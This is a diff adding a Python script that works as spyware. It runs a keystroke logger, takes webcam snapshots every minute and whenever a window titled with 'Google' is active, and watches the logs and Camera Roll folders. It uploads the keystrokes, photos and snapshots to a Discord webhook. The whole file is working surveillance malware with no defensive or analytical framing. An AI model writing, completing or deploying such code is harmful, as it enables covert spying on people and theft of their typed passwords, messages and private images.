@@ -1,0 +1,115 @@
+import os
+import cv2
+import requests
+import time
+import threading
+from pynput.keyboard import Listener
+from datetime import datetime
+import winreg
+import pygetwindow as gw
+import psutil
+from pathlib import Path
+
+LOGS_FOLDER = "logs"
+CAMERA_ROLL_FOLDER = r"C:\Users\YourUsername\Pictures\Camera Roll"  # Change this to your Camera Roll folder path
+
+# Discord webhook URL
+WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"  # Replace with your Discord webhook URL
+
+def on_press(key):
+    try:
+        with open(os.path.join(LOGS_FOLDER, "keystrokes.txt"), "a") as f:
+            f.write(f"{datetime.now()}: {key.char}\n")
+    except AttributeError:
+        with open(os.path.join(LOGS_FOLDER, "keystrokes.txt"), "a") as f:
+            f.write(f"{datetime.now()}: {key}\n")
+
+def on_release(key):
+    if key == 'esc':
+        return False
+
+def take_webcam_snapshot():
+    cap = cv2.VideoCapture(0)
+    if not cap.isOpened():
+        print("No webcam detected.")
+        return
+    ret, frame = cap.read()
+    if ret:
+        webcam_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+        webcam_path = os.path.join(LOGS_FOLDER, f"webcam_snapshot_{webcam_time}.jpg")
+        cv2.imwrite(webcam_path, frame)
+        cap.release()
+        print(f"Webcam snapshot saved as {webcam_path}")
+        send_to_discord(webcam_path)
+    else:
+        cap.release()
+
+def send_to_discord(file_path):
+    with open(file_path, "rb") as file:
+        files = {"file": (os.path.basename(file_path), file)}
+        data = {"content": f"New file: {os.path.basename(file_path)}"}
+        response = requests.post(WEBHOOK_URL, data=data, files=files)
+        if response.status_code == 204:
+            print(f"Successfully sent {file_path} to Discord.")
+        else:
+            print(f"Failed to send {file_path} to Discord. Status code: {response.status_code}")
+
+def monitor_folder():
+    sent_files = set()
+    while True:
+        for folder in [LOGS_FOLDER, CAMERA_ROLL_FOLDER]:
+            if os.path.exists(folder):
+                for file_name in os.listdir(folder):
+                    file_path = os.path.join(folder, file_name)
+                    if os.path.isfile(file_path) and file_path not in sent_files:
+                        if file_name.lower().endswith((".txt", ".png")):
+                            send_to_discord(file_path)
+                            sent_files.add(file_path)
+        time.sleep(5)
+
+# Function to detect if a browser window with Google is active
+def is_google_active():
+    active_window = gw.getActiveWindow()
+    if active_window:
+        window_title = active_window.title.lower()
+        if 'google' in window_title:
+            return True
+    return False
+
+# Function to monitor browser activity and take a webcam snapshot if Google is active
+def monitor_browser_activity():
+    while True:
+        if is_google_active():
+            print("Google is active. Taking a webcam snapshot.")
+            take_webcam_snapshot()
+        time.sleep(5)
+
+# Function to schedule periodic webcam snapshots
+def schedule_webcam_snapshots():
+    while True:
+        take_webcam_snapshot()
+        time.sleep(60)  # Wait 1 minute before taking the next snapshot
+
+# Function to start the keylogger
+def start_keylogger():
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+def run_all_tasks():
+    keylogger_thread = threading.Thread(target=start_keylogger)
+    keylogger_thread.start()
+
+    folder_monitor_thread = threading.Thread(target=monitor_folder)
+    folder_monitor_thread.start()
+
+    browser_monitor_thread = threading.Thread(target=monitor_browser_activity)
+    browser_monitor_thread.start()
+
+    webcam_schedule_thread = threading.Thread(target=schedule_webcam_snapshots)
+    webcam_schedule_thread.start()
+
+if __name__ == "__main__":
+    # Create the necessary folders
+    os.makedirs(LOGS_FOLDER, exist_ok=True)
+
+    run_all_tasks()
